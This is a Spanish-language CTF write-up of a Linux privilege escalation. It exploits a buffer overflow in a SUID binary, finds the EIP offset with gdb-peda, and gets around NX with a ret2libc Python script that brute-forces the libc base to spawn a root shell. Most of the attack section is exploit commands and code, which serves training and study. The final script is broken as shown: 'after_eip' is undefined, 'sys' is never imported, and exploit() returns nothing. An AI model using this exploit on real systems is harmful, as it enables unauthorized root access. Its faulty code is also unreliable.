## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
> Permission denied
id
sudo -l
uname -a

find \-perm -4000 2>/dev/null
```

Aqui vemos un binario interesante `./usr/local/bin/ovrflw`

Lanzamos el binario y vemos que nos pide un input string.


### Bufferoverflow {-}

#### Checkamos si es un bufferoverflow {-}

```bash
ovrflw AAAAAA
ovrflw EEEEEEEEEEEEEEE
which python

ovrflw $(python -c 'print "A"*500')
```

Vemos que hay un **segmentation fault** como error, lo que nos dice que este binario es vulnerable a un Bufferoverflow.

#### Installamos Peda en la maquina victima {-}

Installamos peda en la maquina victima:

```bash
cd /tmp
git clone https://github.com/longld/peda.git
export HOME=/tmp
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

#### Analizamos los registros con peda {-}

```bash
gdb ovrflw
> r
> r AAAA
> r $(python -c 'print "A"*500')
```

```{r, echo = FALSE, fig.cap="EBP EIP overwrite", out.width="90%"}
    knitr::include_graphics("images/October-EBP-EIP-overwrite.png")
```

Aqui vemos que el registrop EBP y EIP han sido sobre escribido. 

#### Buscando el tamaño antes de sobre escribir el EIP {-}

Creamos un patron con peda

```bash
> pattern_create 500
gdb-peda$ pattern_create 500
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAg
AA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAA
wAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%J
A%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%u
A%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3As
IAseAs4AsJAsfAs5AsKAsgAs6A'

> r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAA
wAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%u
A%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
```

Si le damos a `p $eip` ya sabemos que es el valor del eip en este caso `0x41384141`. Ya podemos calcular el offset.

```bash
pattern_offset 0x41384141
```

ya nos dice que el offset es de 112.

Lo comprobamos poniendo 112 A y 4 B.

```bash
> r $(python -c 'print "A"*112 + "B"*4)
```

Aqui ya vemos que el EIP vale `0x42424242` que son 4 B en hexadecimal

#### Buscando la direccion despues del registro EIP {-}

```bash
> r $(python -c 'print "A"*112 + "B"*4 + "C"*200)
> x/80wx $esp
```

```{r, echo = FALSE, fig.cap="ESP Entries", out.width="90%"}
    knitr::include_graphics("images/October-esp_entries.png")
```

La idea seria de appuntar el EIP a la direccion `0xbf8d5310` y cambiar los C por codigo malicioso pero si miramos
las proteccionnes del programa con 

```bash
> checksec
```

Vemos que el NX esta Enabled. El NX tambien llamado DEP (Data Execution Prevention) es una proteccion que deshabilita la 
ejecucion de codigo en la pila, esto significa que si le ponemos codigo malicioso en el EIP, el flujo del programa no lo 
va a ejecutar.

Como no se puede ejecutar nada directamente en la pila, tenemos que mirar las libraries compartidas del programa para ver
si podemos llamar a otra cosa que la propria pila.

#### Buscando librerias compartidas {-}

```bash
ldd /usr/local/bin/ovrflw
    linux-gate.so
    libc.so.6
    /lib/ld-linux.so.2
```

Aqui la libreria `libc.so` esta interesante porque nos permitiria ejecutar commandos a nivel de systema. Y si recordamos bien,
el binario ovrflw tiene permisos SUID.

```bash
ldd /usr/local/bin/ovrflw
ldd /usr/local/bin/ovrflw | grep libc
ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}'
ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'
```

Aqui vemos la direccion de la libreria `0xb758a000`

Miramos si la direccion cambia a cada ejecucion

```bash
for i in $(seq 10); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
```

Aqui vemos que la direccion esta cambiando. Pero si cojemos una de la direcciones por ejemplo la `0xb75e7000` y la grepeamos
al bucle

```bash
for i in $(seq 10); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'; done | grep "0xb75e7000"
```

nos damos cuenta que esta direccion apparece multiples vecez. Esto pasa porque estamos frente una maquina de 32 bits.

#### La technica ret2libc {-}

La technica ret2libc es una technica que funcciona de una manera muy sencilla y es poniendole la direccion de la funccion system, seguida de la funccion
exit sequida de la funccion que queremos lanzar con la libreria en nuestro caso un /bin/sh.

Para encontrar la direccionnes de estas funcciones, primero tenemos que encontrar el offset que seria la differencia entre la posicion de la funccion con la
posicion de la libreria. Esto quiere decir que si sumamos los dos, conocemos la direccion de las differentes funccionnes.

Para conocer el offset, utilizamos la utilidad readelf:

1. Buscamos el offset del commado **system** de la libreria libc.so

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "system"
    ```

1. Buscamos el offset del commando **exit** de la misma libreria

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "exit"
    ```

1. Buscamos el offset del commando **/bin/sh** en la misma libreria

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "/bin/sh"
    ```

los offsets encontrados en este caso son:

- system    : 00040310
- exit      : 00033260
- /bin/sh   : 162bac

La utilidad readelf nos permitte ver el offset de estos commandos de manera a que si sumamos la direccion de la libreria libc.so
al offset, conocemos la direccion exacta de los differentes commandos.

Una vez connocemos estas direcciones, utilizaremos la techniqua ret2libc para ejecutar el commando /bin/sh como root.

#### Creamos el exploit en python {-}

```python
#!/usr/bin/python3

import signal
from struct import pack
from subprocess import call

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n\n")
    sys.exit(1)

#Ctrl_C
signal.signal(signal.SIGINT, def_handler)

def exploit():
    base_libc_address = 0xb75e7000

    system_address_offset = 0x00040310
    exit_address_offset = 0x00033260
    bin_sh_address_offset = 0x00162bac

    system_address = pack("<I", base_libc_address + system_address_offset)
    exit_address = pack("<I", base_libc_address + exit_address_offset)
    bin_sh = pack("<I", base_libc_address + bin_sh_address_offset)

    offset = 112
    before_eip = b"A"*offset
    eip = system_address + exit_address + bin_sh

    payload = before_eip + eip + after_eip

if __name__ == '__main__':
    payload = exploit()

    while True:
        response = call(["/usr/local/bin/ovrflw", payload])

        if response == 0:
            print("\n\n[!] Saliendo...\n\n")
            sys.exit(1)

```

En este script podemos ver que el valor que queremos dar al EIP es el **ret2libc** (system address + exit address + /bin/sh address).

Si lanzamos el script `python3 exploit.py`, va a tardar un poco. Tardara finalmente el tiempo que la direccion de la libreria libc sea la misma 
que la que hemos puesto en el script.

Ya vemos que nos entabla un /bin/sh y `whoami` -> root.

